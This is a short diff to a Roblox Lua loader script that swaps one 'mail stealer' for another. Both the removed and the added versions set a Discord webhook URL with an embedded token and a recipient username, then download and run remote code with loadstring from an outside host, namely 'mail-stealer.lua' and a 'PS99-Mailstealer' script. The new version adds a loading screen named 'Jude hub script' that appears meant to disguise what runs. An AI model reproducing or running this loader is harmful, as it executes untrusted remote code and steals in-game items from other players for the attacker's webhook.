@@ -1,4 +1,6 @@
-getgenv().webhook = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2" 
-getgenv().name = "raniel_jud"
-getgenv().mouselock = true
-loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
+Username = "raniel_jud"
+Webhook = "https://discord.com/api/webhooks/1181579702687780914/_gUChUybS-LKSstwIalaBBE60FG-74H_PGfVzUm2AOjP_bN1p-Z3MRjHjaemM1l2757U"
+selectedLoadingScreen = "Jude hub script"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
